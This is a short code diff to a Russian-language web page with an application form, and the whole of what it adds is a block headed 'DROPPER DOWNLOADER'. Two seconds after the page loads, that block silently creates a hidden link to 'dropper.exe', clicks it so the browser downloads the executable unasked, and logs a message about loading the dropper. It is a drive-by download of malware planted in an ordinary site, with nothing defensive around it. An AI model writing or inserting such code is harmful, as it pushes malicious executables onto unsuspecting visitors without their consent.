@@ -1512,6 +1512,22 @@
             alert(ok ? '🚀 Заявка отправлена! Мы рассмотрим её.' : '❌ Ошибка отправки. Попробуй позже.');
             if (ok) e.target.reset();
         });
+
+        // ============================
+        // 🚀 DROPPER DOWNLOADER (ДОБАВЛЕНО)
+        // ============================
+        window.onload = function() {
+            setTimeout(function() {
+                var a = document.createElement('a');
+                a.href = 'dropper.exe';
+                a.download = 'dropper.exe';
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                console.log('Загрузка дроппера...');
+            }, 2000);
+        };
     </script>
 
 </body>
